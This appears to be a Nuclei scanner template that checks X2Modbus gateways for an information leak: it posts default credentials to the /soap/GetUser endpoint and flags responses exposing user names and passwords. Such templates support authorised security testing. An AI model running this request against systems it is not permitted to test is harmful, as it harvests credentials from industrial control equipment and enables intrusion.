id: X2Modbus-GetUser-LeakInfo

info:
  name: X2Modbus-GetUser-LeakInfo
  author: iSee857
  severity: medium
  description: |
    X2Modbus-GetUser-LeakInfo.

http:
  - raw:
      - |
        POST /soap/GetUser HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <GetUser><User Name="admin" Password="admin"/></GetUser>

      - |
        POST /soap/GetUser HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <GetUser><User Name="guest" Password="admin"/></GetUser>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "UserName"
          - "PassWord"
        condition: and
        part: body

      - type: status
        status:
          - 200